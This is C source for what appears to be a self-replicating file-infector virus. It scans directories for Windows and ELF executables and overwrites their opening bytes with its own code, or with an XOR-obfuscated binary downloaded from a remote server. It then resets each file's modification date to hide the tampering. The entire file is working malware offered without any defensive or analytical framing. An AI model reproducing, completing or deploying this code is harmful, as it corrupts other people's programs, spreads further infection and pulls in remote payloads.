#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "common.h"
#include "os.h"
#include "web.h"
#include "clonelib.h"
#include "thirdparty/b64.h"


unsigned int getRemoteBytes(char** decrypted_msg, const char* url){
	//get encoded message
	char* encoded_msg=getHypertext(url);
	
	//Decode message
	char* decoded_msg;
	unsigned int raw_msg_size=b64decode(&decoded_msg,encoded_msg);
	
	//Deallocate and allocate
	free(encoded_msg);
	*decrypted_msg=(char*)malloc(sizeof(char)*(raw_msg_size-XOR_KEY_SIZE));
	char key[XOR_KEY_SIZE];

	//Decrypt message
	for(unsigned int i=0;i<raw_msg_size;i++){
		if(i<XOR_KEY_SIZE){
			key[i]=decoded_msg[i];
		}else{
			//XOR with key
			(*decrypted_msg)[i-XOR_KEY_SIZE]=decoded_msg[i]^key[(i-XOR_KEY_SIZE)%XOR_KEY_SIZE];
		}
	}

	//Perform one-byte Integrity check
	if (*decrypted_msg[raw_msg_size-XOR_KEY_SIZE-1]!=(*decrypted_msg[0] ^ *decrypted_msg[raw_msg_size-XOR_KEY_SIZE-2]))
		fprintf(stderr,"Error: getRemoteBytes: integrity check failed\n");
	
	//Deallocate memory
	free(decoded_msg);
	
	
	
	return raw_msg_size-XOR_KEY_SIZE-1;
}
unsigned int getOwnBytes(char** bytes, const char* arg0){	
	//Get name of executable
	char* execname;
	#ifdef _WIN32
		if(strcmp(getFileExtension(arg0),"exe\0") && strcmp(getFileExtension(arg0),"com\0")){
			execname=(char*)malloc(sizeof(char)*(strlen(arg0)+4));
			strcpy(execname,arg0);
			strcat(execname,".exe");
		}else{
			execname=(char*)malloc(sizeof(char)*strlen(arg0));
			strcpy(execname,arg0);
		}
	#else
		execname=(char*)malloc(sizeof(char)*strlen(arg0));
		strcpy(execname,arg0);
	#endif

	
	//Open self
	FILE* self_fp=fopen(execname,"rb");
	
	//Check filesize
	fseek(self_fp,0,SEEK_END);
	unsigned int size=ftell(self_fp);
	fseek(self_fp,0,SEEK_SET);
	
	//Get own bytes
	(*bytes)=(char*)malloc(sizeof(char)*size);
	fread(*bytes,1,size,self_fp);
	
	//Clean up
	fclose(self_fp);
	free(execname);
	
	//Return size of bytes
	return size;
}


bool infectTarget(const char* target, const char* malcode, unsigned int malsize){
	
	//Get target modify date
	int64_t tardate=getFileModifiedDate(target);
	
	//Open target file
	FILE* tarfile=fopen(target,"rb");
	if(tarfile==NULL)return 0;
	
	//Get target file size
	fseek(tarfile,0,SEEK_END);
	unsigned int tarsize=ftell(tarfile);
	fseek(tarfile,0,SEEK_SET);
	
	//Read target file
	char* tarcode=(char*)malloc(sizeof(char)*tarsize);
	fread(tarcode,1,tarsize,tarfile);
	fclose(tarfile);
	
	
	//Limit executable size
	/*FIXME: Code transfer size should be limited dynamically,
	not statically*/
	malsize=(malsize>MAX_EXEC_SIZE)?MAX_EXEC_SIZE:malsize;
	
	//Open target for cloning
	tarfile=fopen(target,"wb");
	if(tarfile==NULL)return 0;

	
	//Clone to target
	for(unsigned int i=0;i<malsize;i++){fprintf(tarfile,"%c",malcode[i]);}
	
	//Fill with original bytes and close
	if(tarsize>malsize){
		for(unsigned int i=0;i<(tarsize-malsize);i++)
			fprintf(tarfile,"%c",tarcode[malsize+i]);
	}
	fclose(tarfile);
	
	//Reset modify date
	setFileModifiedDate(target,tardate);
	
	//Free memory and return
	free(tarcode);
	return 1;
}

bool infectDirectory(const char* path, const char* arg0){
	//Get list of files
	char** ls=walkDir(path);
	
	//Go through files
	for(unsigned int i=0;strcmp(ls[i],"\0");i++){
		
		//Check if possible executable
		if(!strcmp(getFileExtension(ls[i]),"\0") || !strcmp(getFileExtension(ls[i]),"exe\0")){
			
			//Make sure target under 2 GB
			if(getFileSize(ls[i])<=INT32_MAX){
				
				//Check if definite executable
				Executable* exectype=getExecType(ls[i]);
				if(exectype->is_exec){	
					printf("%s",ls[i]);
					if(exectype->is_native ){
						//Copy own code
						printf("(native)\n");
						char* bytes;
						unsigned int bytes_size=getOwnBytes(&bytes,arg0);
						printf("%d",infectTarget(ls[i],bytes,bytes_size));
						free(bytes);
						
					}else if(CROSS_PLATFORM_ON){
						char* remote_url=(char*)malloc(sizeof(char)*strlen(SERVER_HOSTNAME XBIN_WIN64));
						if(exectype->is_win){
							//Get windows binary
							printf("(windows)");
							strcpy(remote_url,SERVER_HOSTNAME XBIN_WIN64);
							
						}else if(exectype->is_elf){
							//Get elf/linux binary
							printf("(elf)");
							strcpy(remote_url,SERVER_HOSTNAME XBIN_ELF64);
							
						}else{
							printf("Error(clonelib.c) - No platform\n");
							return false;
						}
						
						//Copy code from external binary
						char* bytes;
						unsigned int bytes_size=getRemoteBytes(&bytes,remote_url);
						printf("%d",infectTarget(ls[i],bytes,bytes_size));
						free(bytes);
						free(remote_url);
					}
					printf("\n");
				}
				//Free memory
				free(exectype);
				free(ls[i]);
			}
		}
	}
	
	free(ls);
	return true;
}